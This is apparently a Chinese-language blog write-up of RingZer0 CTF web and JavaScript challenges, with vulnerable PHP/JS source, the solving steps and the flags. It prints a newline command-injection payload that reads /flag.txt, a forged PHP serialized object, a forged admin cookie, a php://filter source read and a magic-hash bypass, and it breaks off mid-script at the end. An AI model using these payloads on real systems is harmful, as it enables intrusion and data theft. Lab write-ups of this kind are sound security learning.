<h1 id="PHP-Fairy"><a href="#PHP-Fairy" class="headerlink" title="PHP Fairy"></a>PHP Fairy</h1><p>有一个登陆框。题目给了源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$output = <span class="string">""</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>])) &#123;</div><div class="line">  $content = file_get_contents(<span class="keyword">__FILE__</span>);</div><div class="line">  $content = preg_replace(<span class="string">'/FLAG\-[0-9a-zA-Z_?!.,]+/i'</span>, <span class="string">'FLAG-XXXXXXXXXXXXXXXXXXXXXXX'</span>, $content);</div><div class="line">  <span class="keyword">echo</span> <span class="string">'&lt;div class="code-highlight"&gt;'</span>;</div><div class="line">  highlight_string($content);</div><div class="line">  <span class="keyword">echo</span> <span class="string">'&lt;/div&gt;'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>])) &#123;</div><div class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">'/^[^\W_]+$/'</span>, $_GET[<span class="string">'pass'</span>])) &#123;</div><div class="line">    $output = <span class="string">"Don't hack me please :("</span>;</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line"></div><div class="line">    $pass = md5(<span class="string">"admin1674227342"</span>);</div><div class="line">    <span class="keyword">if</span> ((((((((($_GET[<span class="string">'pass'</span>] == $pass)))) &amp;&amp; (((($pass !== $_GET[<span class="string">'pass'</span>]))))) || ((((($pass == $_GET[<span class="string">'pass'</span>])))) &amp;&amp; ((($_GET[<span class="string">'pass'</span>] !== $pass)))))))) &#123; <span class="comment">// Trolling u lisp masta</span></div><div class="line">      <span class="keyword">if</span> (strlen($pass) == strlen($_GET[<span class="string">'pass'</span>])) &#123;</div><div class="line">        $output = <span class="string">"&lt;div class='alert alert-success'&gt;FLAG-XXXXXXXXXXXXXXXXXXXXXXX&lt;/div&gt;"</span>;</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $output = <span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password&lt;/div&gt;"</span>;</div><div class="line">      &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      $output = <span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password&lt;/div&gt;"</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>考察php弱类型。经过md5加密后生成以0e开头的字符串，而以0e开头的字符串用<code>==</code>比较时会被转换成<code>0 == 0</code>即成立。而<code>!==</code> 不仅比较值，而且还会比较类型。所以我们只要传入pass的值为一个0e开头的值，并且长度为32位（$pass长度为32位），比如说：0e509367213418206700842008763514。</p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-K7PY48gt02T1yvoO9jzP694FztgR1jIS</div></pre></td></tr></table></figure></p>
<h1 id="Malicious-upload"><a href="#Malicious-upload" class="headerlink" title="Malicious upload"></a>Malicious upload</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/9.jpg?raw=true" alt=""></p>
<p>上传题，一般关注文件名后缀和content-type。经过fuzz：）知道，对filename，服务器端的检测时从左向右匹配<code>.xxx</code>，若遇到的第一个<code>.xxx</code>不是png则上传失败，另一个就是需要把content-type设置为<code>image/png</code></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/10.jpg?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-ve46i9UFtDh8Xd4hnqKRkP17</div></pre></td></tr></table></figure></p>
<h1 id="Security-through-obscurity"><a href="#Security-through-obscurity" class="headerlink" title="Security through obscurity!"></a>Security through obscurity!</h1><p>题目说：<code>You don&#39;t have admin access.</code>。一脸懵逼，抓包发现一个奇奇怪怪的cookie：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/11.jpg?raw=true" alt=""></p>
<p>看着。。就很像base64加密；)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64decode(<span class="string">'Z3Vlc3QsZTczOGIwOTlhNjY0ZTAwZSwxNDk4OTA4NzM2LGZhbHNlOjIyOWQ3NDU5MmQ5MjNiOThlZjA3NjViNTU5OTkyZDI1'</span>)</div><div class="line"><span class="string">b'guest,e738b099a664e00e,1498908736,false:229d74592d923b98ef0765b559992d25'</span></div></pre></td></tr></table></figure>
<p>后面那串感觉很像md5，解密无果。想想先尝试改改一些东西,，比如把guest改成admin，false改成true，base64加密后得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">YWRtaW4sZTczOGIwOTlhNjY0ZTAwZSwxNDk4OTA4NzM2LHRydWU6MjI5ZDc0NTkyZDkyM2I5OGVmMDc2NWI1NTk5OTJkMjU=</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/12.jpg?raw=true" alt=""><br>所以基本可以断定后面那串是md5，发包后，提示<br>之后我把原始的包，没有改过cookie的包直接fowward掉后提示说：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Expired cookie.</div></pre></td></tr></table></figure></p>
<p>说明有时间限制，结合前面做过的题目推断<code>1498908736</code>是unix时间戳，它可以直接转换为<code>2017/7/1 19:32:16</code>。<br>接下来，从整体上看一下这个cookie，它被冒号<code>:</code>分为两段。所以：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">md5(&quot;guest,e738b099a664e00e,1498908736,false&quot;)  =&gt;  229d74592d923b98ef0765b559992d25</div></pre></td></tr></table></figure></p>
<p>不过，第二个值不清楚是如何生成的，也许只是个随机值。所以我们改一改，记得把unix时间戳改大一点不然会提示过期：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">md5(&quot;admin,e738b099a664e00e,1498999999,true&quot;) =&gt; 05fda7a65b3ac89393e7de85bc8db295</div><div class="line">base64(&quot;admin,e738b099a664e00e,1498999999,true:05fda7a65b3ac89393e7de85bc8db295&quot;)</div><div class="line">	=&gt; YWRtaW4sZTczOGIwOTlhNjY0ZTAwZSwxNDk4OTk5OTk5LHRydWU6MDVmZGE3YTY1YjNhYzg5MzkzZTdkZTg1YmM4ZGIyOTU=</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/13.jpg?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-Feg03OSzWhxO03K94108100f</div></pre></td></tr></table></figure></p>
<h1 id="REST-in-peace"><a href="#REST-in-peace" class="headerlink" title="REST in peace"></a>REST in peace</h1><p>题目提示：Your goal is to get superadmin access<br>题目地址是：<a href="https://ringzer0team.com/challenges_page/web100_c0f8a764ea6592548917aaf18261f42c.php" target="_blank" rel="external">https://ringzer0team.com/challenges_page/web100_c0f8a764ea6592548917aaf18261f42c.php</a><br>直接访问会显示Access Denied。<br>抓包后在响应包头部发现奇怪的东东，见下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/14.jpg?raw=true" alt=""></p>
<p>发现是sha512加密，简单咯：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/15.jpg?raw=true" alt=""></p>
<p>将字符串admin经过sha512加密后，在请求包中添加Strong-Auth字段。发送后得到以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Document title										security level</div><div class="line">The secret of the universe.docx 						private</div><div class="line">Be Better In Bed By Richard MacDonald.docx 				public</div><div class="line">This file may contain a flag or not.docx 			extremely private</div></pre></td></tr></table></figure></p>
<p>然后，，然后我还没做出来。待续。</p>
<h1 id="PHP-feature-or-0day"><a href="#PHP-feature-or-0day" class="headerlink" title="PHP feature or 0day?"></a>PHP feature or 0day?</h1><p>题目给了源码。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">ini_set(<span class="string">'error_displays'</span>, <span class="number">0</span>);</div><div class="line">$ip = htmlspecialchars($_GET[<span class="string">'url'</span>], ENT_QUOTES);</div><div class="line"></div><div class="line">$f = fsockopen($ip, <span class="number">80</span>, $errno, $errstr, <span class="number">5</span>);</div><div class="line"><span class="keyword">if</span>($f) &#123;</div><div class="line">	$result = shell_exec(<span class="string">'ping -c 4 '</span> . $ip);</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;div class="alert alert-success"&gt;'</span> . nl2br($result) . <span class="string">'&lt;/div&gt;'</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;div class="alert alert-danger"&gt;'</span> .$errstr . <span class="string">'&lt;/div&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>%0a绕过即可。<br>payload1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">127.0.0.1%0als /</div></pre></td></tr></table></figure></p>
<p>发现有flag.txt。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/10.jpg?raw=true" alt=""></p>
<p>payload2：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">127.0.0.1%0acat /flag.txt</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-v0195ZH325rG9m20043Blm92LeRE77aF</div></pre></td></tr></table></figure></p>
<h1 id="Password-reset-reloaded"><a href="#Password-reset-reloaded" class="headerlink" title="Password reset reloaded"></a>Password reset reloaded</h1><p>题目提供了源码。伪随机数的问题，跟前面的reset passwd的题一样，点了reset后，会提示说：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Reset password link has been sent to admin@youdontownthisemailagain.com. Please follow the link http://ringzer0team.com/challenges/120/?k=[your 16 digits code] soon as possible your token expired in 1 hour.</div></pre></td></tr></table></figure></p>
<p>所以为了得到16位digits code，需要得到randomDigit。为得到randomDigit，需要先得到seed。而seed由<code>$seed = (int)bin2hex(openssl_random_pseudo_bytes($size / 2));</code>生成。用如下php代码生成：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        $token = <span class="string">""</span>;</div><div class="line">        $size = <span class="number">32</span>;</div><div class="line">        $seed = (int)bin2hex(openssl_random_pseudo_bytes($size / <span class="number">2</span>));</div><div class="line">        srand($seed);</div><div class="line"></div><div class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++) &#123;</div><div class="line">                $randomDigit = (string)rand() % <span class="number">10</span>;</div><div class="line">                $token .= <span class="string">","</span> . $randomDigit;</div><div class="line">        &#125;</div><div class="line">        $token = str_replace(<span class="string">","</span>, <span class="string">""</span>, $token);</div><div class="line">        <span class="keyword">echo</span> $token;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>得到16位digit code为3675356291270936。访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://ringzer0team.com/challenges/120/?k=3675356291270936</div></pre></td></tr></table></figure></p>
<p>得到passwd：CrytoIsCool!1337。登陆得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-LPmaGkfnDHrsMoOyHA7nIjOPRy</div></pre></td></tr></table></figure></p>
<h1 id="Serial-killer"><a href="#Serial-killer" class="headerlink" title="Serial killer!"></a>Serial killer!</h1><p>点进去时链接是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://ringzer0team.com/challenges/41/?o=TzoxMToiUmFuZG9tQ2xhc3MiOjE6e3M6MjA6IgBSYW5kb21DbGFzcwB1U3RydWN0IjtPOjg6InN0ZENsYXNzIjoxOntzOjY6ImFjdGlvbiI7czoxNDoiR2V0Q3VycmVudERhdGUiO319</div></pre></td></tr></table></figure></p>
<p>后面跟的一串base64加密，解密后为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;O:11:&quot;RandomClass&quot;:1:&#123;s:20:&quot;\x00RandomClass\x00uStruct&quot;;O:8:&quot;stdClass&quot;:1:&#123;s:6:&quot;action&quot;;s:14:&quot;GetCurrentDate&quot;;&#125;&#125;&apos;</div></pre></td></tr></table></figure></p>
<p>注意解密后里有<code>\x00</code>，是不可显示字符。从base64解密结果猜测为php反序列化问题。我们随便参数改改，传进去试试，结果得到报错：</p>
<p>格式化后源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RandomClass</span> </span>&#123;</div><div class="line">	<span class="keyword">private</span> <span class="keyword">static</span> $instance;</div><div class="line">	<span class="keyword">private</span> $uStruct;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</div><div class="line">		<span class="keyword">$this</span>-&gt;uStruct = (object)<span class="keyword">array</span>();</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">GetInstance</span><span class="params">()</span> </span>&#123;</div><div class="line">		<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="keyword">self</span>::$instance)) &#123;</div><div class="line">			<span class="keyword">self</span>::$instance = <span class="keyword">new</span> <span class="keyword">self</span>();</div><div class="line">		&#125; <span class="keyword">return</span> <span class="keyword">self</span>::$instance;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key, $value)</span> </span>&#123;</div><div class="line">		<span class="keyword">$this</span>-&gt;uStruct-&gt;$key = $value;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span> </span>&#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;uStruct-&gt;$key;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">DoAction</span><span class="params">()</span> </span>&#123;</div><div class="line">		$action = <span class="keyword">$this</span>-&gt;uStruct-&gt;action;</div><div class="line">		<span class="keyword">$this</span>-&gt;$action();</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">GetCurrentDate</span><span class="params">()</span> </span>&#123;</div><div class="line">		GetCurrentDate(<span class="keyword">$this</span>-&gt;uStruct);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ShowFlag</span><span class="params">()</span> </span>&#123;</div><div class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;uStruct-&gt;time !== <span class="keyword">null</span> &amp;&amp; <span class="keyword">$this</span>-&gt;uStruct-&gt;flag == <span class="string">'Please?'</span>) &#123;</div><div class="line">			ShowFlag(<span class="keyword">$this</span>-&gt;uStruct);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">GetOutput</span><span class="params">()</span> </span>&#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;uStruct-&gt;output;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>由源码知道，uStruct由(object)array()得到，我们需要设置uStruct的action指为’ShowFlag’，这样才会调用ShowFlag函数。设置uStruct的flag值为’Please?’，设置uStruct的time值不为空，才能正确打印出flag。<br>用如下脚本构造：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RandomClass</span> </span>&#123;</div><div class="line">	<span class="keyword">private</span> <span class="keyword">static</span> $instance;</div><div class="line">	<span class="keyword">private</span> $uStruct;</div><div class="line"></div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</div><div class="line">		<span class="keyword">$this</span>-&gt;uStruct = (object)<span class="keyword">array</span>(<span class="string">'action'</span>=&gt;<span class="string">'ShowFlag'</span>,<span class="string">'time'</span> =&gt; <span class="string">'1'</span>,<span class="string">'flag'</span> =&gt; <span class="string">'Please?'</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">$chybeta = <span class="keyword">new</span> RandomClass();</div><div class="line"><span class="keyword">echo</span> serialize($chybeta);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:11:&quot;RandomClass&quot;:1:&#123;s:20:&quot;RandomClassuStruct&quot;;O:8:&quot;stdClass&quot;:3:&#123;s:6:&quot;action&quot;;s:8:&quot;ShowFlag&quot;;s:4:&quot;time&quot;;s:1:&quot;1&quot;;s:4:&quot;flag&quot;;s:7:&quot;Please?&quot;;&#125;&#125;</div></pre></td></tr></table></figure></p>
<p>为能让服务器端正确解析，需要再加入两个不可见字符<code>\x00</code>，用python脚本如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="comment"># a = 'O:11:"RandomClass":1:&#123;s:20:"\x00RandomClass\x00uStruct";O:8:"stdClass":1:&#123;s:6:"action";s:14:"GetCurrentDate";&#125;&#125;';</span></div><div class="line">a =<span class="string">'O:11:"RandomClass":1:&#123;s:20:"\x00RandomClass\x00uStruct";O:8:"stdClass":3:&#123;s:6:"action";s:8:"ShowFlag";s:4:"time";s:1:"1";s:4:"flag";s:7:"Please?";&#125;&#125; '</span></div><div class="line"><span class="keyword">print</span> base64.b64encode(a)</div></pre></td></tr></table></figure></p>
<p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TzoxMToiUmFuZG9tQ2xhc3MiOjE6e3M6MjA6IgBSYW5kb21DbGFzcwB1U3RydWN0IjtPOjg6InN0ZENsYXNzIjozOntzOjY6ImFjdGlvbiI7czo4OiJTaG93RmxhZyI7czo0OiJ0aW1lIjtzOjE6IjEiO3M6NDoiZmxhZyI7czo3OiJQbGVhc2U/Ijt9fSA=</div></pre></td></tr></table></figure></p>
<p>抓包，替换参数，如下：</p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-Wz87W7Rv0nmK75Hmbq41qc2i</div></pre></td></tr></table></figure></p>
<h1 id="Looking-for-the-flag"><a href="#Looking-for-the-flag" class="headerlink" title="Looking for the flag?"></a>Looking for the flag?</h1><p>可以用php://filter读到源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ringzer0team.com:1008/?page=php://filter/read=convert.base64-encode/resource=index.php</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-MeCXGBsrLlYtdxlxSbumtUbb4J</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ringzer0team-web&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ringzer0team-js-writeup</title>
    <link href="http://yoursite.com/2017/06/30/%C2%96ringzer0team-js-writeup/"/>
    <id>http://yoursite.com/2017/06/30/ringzer0team-js-writeup/</id>
    <published>2017-06-30T05:19:46.000Z</published>
    <updated>2017-06-30T08:17:42.740Z</updated>
    
    <content type="html"><![CDATA[<p>未完待续..待续..<br><a id="more"></a></p>
<h1 id="Client-side-validation-is-so-secure"><a href="#Client-side-validation-is-so-secure" class="headerlink" title="Client side validation is so secure?"></a>Client side validation is so secure?</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/1.jpg?raw=true" alt=""></p>
<p>查看源代码，发现下面的js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">		<span class="comment">// Look's like weak JavaScript auth script :)</span></div><div class="line">		$(<span class="string">".c_submit"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">			event.preventDefault()</div><div class="line">			<span class="keyword">var</span> u = $(<span class="string">"#cuser"</span>).val();</div><div class="line">			<span class="keyword">var</span> p = $(<span class="string">"#cpass"</span>).val();</div><div class="line">			<span class="keyword">if</span>(u == <span class="string">"admin"</span> &amp;&amp; p == <span class="built_in">String</span>.fromCharCode(<span class="number">74</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">83</span>,<span class="number">99</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">116</span>,<span class="number">73</span>,<span class="number">115</span>,<span class="number">83</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">101</span>)) &#123;</div><div class="line">				<span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;   </div><div class="line">					<span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + p;</div><div class="line">				&#125;</div><div class="line">			&#125; <span class="keyword">else</span> &#123;</div><div class="line">				$(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</div><div class="line">			&#125;</div><div class="line">		&#125;);</div><div class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></td></tr></table></figure></p>
<p>用控制台运行一下得到密码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">String.fromCharCode(74,97,118,97,83,99,114,105,112,116,73,115,83,101,99,117,114,101)</div><div class="line">&quot;JavaScriptIsSecure&quot;</div></pre></td></tr></table></figure></p>
<p>填入账号admin，密码JavaScriptIsSecure，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-66Jq5u688he0y46564481WRh</div></pre></td></tr></table></figure></p>
<h1 id="Is-hashing-more-secure"><a href="#Is-hashing-more-secure" class="headerlink" title="Is hashing more secure?"></a>Is hashing more secure?</h1><p>查看源代码，发现js：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">".c_submit"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">	event.preventDefault();</div><div class="line">	<span class="keyword">var</span> p = $(<span class="string">"#cpass"</span>).val();</div><div class="line">	<span class="keyword">if</span>(Sha1.hash(p) == <span class="string">"b89356ff6151527e89c4f3e3d30c8e6586c63962"</span>) &#123;</div><div class="line">		<span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;   </div><div class="line">			<span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + p;</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		$(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>工具网站：<a href="http://hashtoolkit.com" target="_blank" rel="external">http://hashtoolkit.com</a><br>得到密码为；adminz。填入，得到flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-bXNsYg9tLCaIX6h1UiQMmMYB</div></pre></td></tr></table></figure></p>
<h1 id="Then-obfuscation-is-more-secure"><a href="#Then-obfuscation-is-more-secure" class="headerlink" title="Then obfuscation is more secure?"></a>Then obfuscation is more secure?</h1><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">			// Look's like weak JavaScript auth script :)</div><div class="line">			var _0xc360=["\x76\x61\x6C","\x23\x63\x70\x61\x73\x73","\x61\x6C\x6B\x33","\x30\x32\x6C\x31","\x3F\x70\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x27\x65\x72\x72\x6F\x72\x27\x3E\x57\x72\x6F\x6E\x67\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x20\x73\x6F\x72\x72\x79\x2E\x3C\x2F\x64\x69\x76\x3E","\x68\x74\x6D\x6C","\x23\x63\x72\x65\x73\x70\x6F\x6E\x73\x65","\x63\x6C\x69\x63\x6B","\x2E\x63\x5F\x73\x75\x62\x6D\x69\x74"];$(.c_submit)[click](function ()&#123;var _0xf382x1=$(#cpass)[val]();var 